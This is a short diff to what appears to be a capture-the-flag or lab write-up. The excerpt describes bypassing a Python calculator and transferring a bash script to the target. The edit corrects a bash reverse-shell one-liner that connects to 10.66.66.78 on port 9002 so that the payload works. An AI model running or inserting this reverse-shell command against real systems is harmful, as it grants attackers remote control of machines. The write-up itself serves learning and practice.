@@ -77,7 +77,7 @@ Since it's a simple python maths calculator, we can easily bypasss the pythin fu
 We created a bash file with contains our bash reverse liner. a simple bash script, transfered the bash file to the target. 
 ```shell
 #!/bin/bash
-bash -c  'bash -i&/dev/tcp/10.66.66.78/9002 0>&1'
+bash -c  'bash -i>&/dev/tcp/10.66.66.78/9002 0>&1'
 ```
 <br>
 
